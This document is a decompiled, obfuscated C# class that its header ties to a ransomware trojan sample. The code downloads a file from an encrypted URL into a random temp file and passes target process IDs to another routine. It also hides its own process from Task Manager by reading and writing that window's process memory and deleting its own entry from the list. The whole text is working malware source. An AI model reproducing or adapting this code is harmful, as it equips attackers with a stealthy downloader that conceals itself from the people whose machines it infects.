// Decompiled with JetBrains decompiler
// Type: gtzdezosLTmcL.lUJYSNgLmoSv
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8444C5B-FCC9-4B9F-A06C-7304BA49E3C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-1d4db8733c5f11ee8fca530aeb4a91069de04b1af64cbe1fa3ae2d3572a6e554.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace gtzdezosLTmcL
{
  internal sealed class lUJYSNgLmoSv
  {
    private static volatile bool ErPrOWDCdMDpq;
    public static volatile bool zKcfHNnkDntP;
    [NonSerialized]
    internal static GetString \u0089;

    public static string GEVxechDmCNkONU()
    {
      pjsEsrnLXK.TsImQHWoLIhPLO = IntPtr.Size != 8 ? lUJYSNgLmoSv.xYYlXqlwLCVd(new Uri(pjsEsrnLXK.rZFwMCmAYamD(lUJYSNgLmoSv.\u0089(107366196)))) : lUJYSNgLmoSv.xYYlXqlwLCVd(new Uri(pjsEsrnLXK.rZFwMCmAYamD(lUJYSNgLmoSv.\u0089(107366342))));
      return pjsEsrnLXK.TsImQHWoLIhPLO;
    }

    public static string xYYlXqlwLCVd([In] Uri obj0)
    {
      try
      {
        string path2 = Path.GetRandomFileName().Replace(lUJYSNgLmoSv.\u0089(107369545), lUJYSNgLmoSv.\u0089(107359772)).Remove(0, 3) + lUJYSNgLmoSv.\u0089(107369572);
        new WebClient().DownloadFile(obj0, Path.Combine(Path.GetTempPath(), path2));
        return Path.Combine(Path.GetTempPath(), path2);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static Process AihHpUDdvmftmixw([In] string obj0)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(obj0))
          return process;
      }
      return (Process) null;
    }

    public static void KOztEqxFQcVJbJv([In] string[] obj0)
    {
      string CcOUsmTEceYrZnz = lUJYSNgLmoSv.GEVxechDmCNkONU();
      if (string.IsNullOrEmpty(CcOUsmTEceYrZnz))
        return;
      while (true)
      {
        foreach (string str1 in obj0)
        {
          Process process = lUJYSNgLmoSv.AihHpUDdvmftmixw(str1);
          if (process != null)
          {
            string str2 = process.Id.ToString();
            pjsEsrnLXK.zNySGPYjPOmLG(CcOUsmTEceYrZnz, str2 + lUJYSNgLmoSv.\u0089(107358284) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));
            pjsEsrnLXK.zNySGPYjPOmLG(CcOUsmTEceYrZnz, str2 + lUJYSNgLmoSv.\u0089(107358284) + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + lUJYSNgLmoSv.\u0089(107366594));
          }
        }
        Thread.Sleep(200);
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    private static extern IntPtr UTQdXBAAWHVktIda([In] int obj0, [In] bool obj1, [In] uint obj2);

    [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx", SetLastError = true)]
    private static extern IntPtr ugpebDGuXGPDDcL(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] uint obj2,
      [In] int obj3,
      [In] int obj4);

    [DllImport("kernel32.dll", EntryPoint = "VirtualFreeEx", SetLastError = true)]
    private static extern bool aZbnMKnvfUKX([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2, [In] int obj3);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool JeXwkzuyXDiRL(IntPtr GQeyVIOQrtjxss);

    [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = true)]
    private static extern bool cCMHGJLVpEe(
      IntPtr GRNltufHEjIXHZ,
      IntPtr PYzWKRcXXBK,
      byte[] DyAGtOCuTfZL,
      uint qXVYLPUjjyjpG,
      out UIntPtr TeZNzSOSOUcIhb);

    [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
    private static extern bool EqQxXzupjAXk(
      IntPtr SIOvOGTefIkMBhU,
      IntPtr FpljOXuXhgFC,
      [Out] byte[] OWKuHLlTWhKe,
      int MkfBxERfVc,
      out UIntPtr BAdYTicYeVgM);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
    private static extern uint NeXIVuGkQCk(IntPtr IZneNRTBfcHi, out uint YFtHpPSVrNFGuVP);

    [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
    private static extern IntPtr KjRJrboOjTk(
      [In] IntPtr obj0,
      [In] uint obj1,
      [In] IntPtr obj2,
      [In] IntPtr obj3);

    [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
    private static extern IntPtr DcmzvBTVCcIyt([In] string obj0, [In] string obj1);

    [DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
    private static extern IntPtr qstoyDhvBVzUO(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] string obj2,
      [In] string obj3);

    private static byte[] wgPzDhUDscEznoV([In] object obj0)
    {
      int length = Marshal.SizeOf(obj0);
      byte[] destination = new byte[length];
      IntPtr num = Marshal.AllocHGlobal(length);
      Marshal.StructureToPtr(obj0, num, true);
      Marshal.Copy(num, destination, 0, length);
      Marshal.FreeHGlobal(num);
      return destination;
    }

    private static IntPtr TrJmSqBlhJUa([In] uint obj0) => lUJYSNgLmoSv.UTQdXBAAWHVktIda(56, false, obj0);

    private static void ihMlvRqLwJpeA([In] IntPtr obj0) => lUJYSNgLmoSv.JeXwkzuyXDiRL(obj0);

    private static IntPtr FNVNFOwUlNLc([In] uint obj0, [In] IntPtr obj1) => lUJYSNgLmoSv.ugpebDGuXGPDDcL(obj1, IntPtr.Zero, obj0, 12288, 4);

    private static void wpaeBdVjTwbpOLC([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2) => lUJYSNgLmoSv.aZbnMKnvfUKX(obj0, obj1, obj2, 32768);

    private static IntPtr cBeJwWyEfNWo()
    {
      IntPtr num = lUJYSNgLmoSv.DcmzvBTVCcIyt(lUJYSNgLmoSv.\u0089(107366585), lUJYSNgLmoSv.\u0089(107366560));
      return !(num == IntPtr.Zero) ? lUJYSNgLmoSv.qstoyDhvBVzUO(lUJYSNgLmoSv.qstoyDhvBVzUO(num, IntPtr.Zero, lUJYSNgLmoSv.\u0089(107366527), (string) null), IntPtr.Zero, lUJYSNgLmoSv.\u0089(107366501), lUJYSNgLmoSv.\u0089(107366467)) : lUJYSNgLmoSv.qstoyDhvBVzUO(lUJYSNgLmoSv.qstoyDhvBVzUO(lUJYSNgLmoSv.DcmzvBTVCcIyt(lUJYSNgLmoSv.\u0089(107366527), lUJYSNgLmoSv.\u0089(107366518)), IntPtr.Zero, lUJYSNgLmoSv.\u0089(107366527), (string) null), IntPtr.Zero, lUJYSNgLmoSv.\u0089(107366501), lUJYSNgLmoSv.\u0089(107366448));
    }

    private static IntPtr JTRAEIJuxDBiPg([In] IntPtr obj0) => lUJYSNgLmoSv.KjRJrboOjTk(obj0, 4100U, IntPtr.Zero, IntPtr.Zero);

    private static void cKJXNoIgIAmGLMj([In] IntPtr obj0, [In] IntPtr obj1) => lUJYSNgLmoSv.KjRJrboOjTk(obj0, 4104U, obj1, IntPtr.Zero);

    private static void AvAZJdjUZSpE([In] IntPtr obj0) => lUJYSNgLmoSv.KjRJrboOjTk(obj0, 4124U, IntPtr.Zero, IntPtr.Zero);

    private static string JvtgxVinocNSyT([In] IntPtr obj0, [In] IntPtr obj1)
    {
      byte[] numArray = new byte[50];
      lUJYSNgLmoSv.eGubbORuAxc structure = new lUJYSNgLmoSv.eGubbORuAxc();
      uint YFtHpPSVrNFGuVP;
      int num1 = (int) lUJYSNgLmoSv.NeXIVuGkQCk(obj0, out YFtHpPSVrNFGuVP);
      IntPtr num2 = lUJYSNgLmoSv.TrJmSqBlhJUa(YFtHpPSVrNFGuVP);
      IntPtr PYzWKRcXXBK = lUJYSNgLmoSv.FNVNFOwUlNLc((uint) Marshal.SizeOf<lUJYSNgLmoSv.eGubbORuAxc>(structure), num2);
      IntPtr FpljOXuXhgFC = lUJYSNgLmoSv.FNVNFOwUlNLc(50U, num2);
      structure.OmcYYCuLQwXCb = obj1;
      structure.OQChoPbOjDReEp = (IntPtr) 0;
      structure.jWdndmcwbyAM = 50U;
      structure.rnwWqOwgyltAcUx = FpljOXuXhgFC;
      UIntPtr num3;
      lUJYSNgLmoSv.cCMHGJLVpEe(num2, PYzWKRcXXBK, lUJYSNgLmoSv.wgPzDhUDscEznoV((object) structure), (uint) Marshal.SizeOf<lUJYSNgLmoSv.eGubbORuAxc>(structure), out num3);
      lUJYSNgLmoSv.KjRJrboOjTk(obj0, 4141U, obj1, PYzWKRcXXBK);
      lUJYSNgLmoSv.EqQxXzupjAXk(num2, FpljOXuXhgFC, numArray, 50, out num3);
      lUJYSNgLmoSv.wpaeBdVjTwbpOLC(num2, PYzWKRcXXBK, (uint) Marshal.SizeOf<lUJYSNgLmoSv.eGubbORuAxc>(structure));
      lUJYSNgLmoSv.wpaeBdVjTwbpOLC(num2, FpljOXuXhgFC, 50U);
      lUJYSNgLmoSv.ihMlvRqLwJpeA(num2);
      return Encoding.ASCII.GetString(numArray);
    }

    private static void PhKdstqqTxizn([In] string obj0)
    {
      IntPtr num1 = lUJYSNgLmoSv.cBeJwWyEfNWo();
      if (!(num1 != IntPtr.Zero))
        return;
      int num2 = (int) lUJYSNgLmoSv.JTRAEIJuxDBiPg(num1);
      for (int index = 0; index < num2; ++index)
      {
        if (lUJYSNgLmoSv.JvtgxVinocNSyT(num1, (IntPtr) index).Contains(obj0))
          lUJYSNgLmoSv.cKJXNoIgIAmGLMj(num1, (IntPtr) index);
      }
    }

    private static void aTZHfkOXSyFwy()
    {
      IntPtr num = lUJYSNgLmoSv.cBeJwWyEfNWo();
      if (!(num != IntPtr.Zero))
        return;
      lUJYSNgLmoSv.AvAZJdjUZSpE(num);
      lUJYSNgLmoSv.AvAZJdjUZSpE(num);
      lUJYSNgLmoSv.AvAZJdjUZSpE(num);
      lUJYSNgLmoSv.AvAZJdjUZSpE(num);
      lUJYSNgLmoSv.AvAZJdjUZSpE(num);
    }

    public static void eIJvGeiCmHwoEXUXS() => new Thread(new ThreadStart(lUJYSNgLmoSv.jjgQqYSNTkxs)).Start();

    private static void jjgQqYSNTkxs()
    {
      while (!lUJYSNgLmoSv.ErPrOWDCdMDpq)
      {
        if (lUJYSNgLmoSv.zKcfHNnkDntP)
        {
          lUJYSNgLmoSv.PhKdstqqTxizn(Process.GetCurrentProcess().ProcessName + lUJYSNgLmoSv.\u0089(107369572));
          Thread.Sleep(525);
        }
        else
        {
          lUJYSNgLmoSv.aTZHfkOXSyFwy();
          Thread.Sleep(1000);
        }
      }
      lUJYSNgLmoSv.ErPrOWDCdMDpq = false;
    }

    static lUJYSNgLmoSv()
    {
      Strings.CreateGetStringDelegate(typeof (lUJYSNgLmoSv));
      lUJYSNgLmoSv.ErPrOWDCdMDpq = false;
      lUJYSNgLmoSv.zKcfHNnkDntP = true;
    }

    private struct eGubbORuAxc
    {
      public uint MazwPWkmBuTbyBU;
      public IntPtr OmcYYCuLQwXCb;
      public IntPtr OQChoPbOjDReEp;
      public uint FNsWvvBRCHwpw;
      public uint ZBoGaMxvPmRYq;
      public IntPtr rnwWqOwgyltAcUx;
      public uint jWdndmcwbyAM;
      public int nKlfiQnINEomt;
      public IntPtr hUFsFnpLIBsZEY;
    }
  }
}
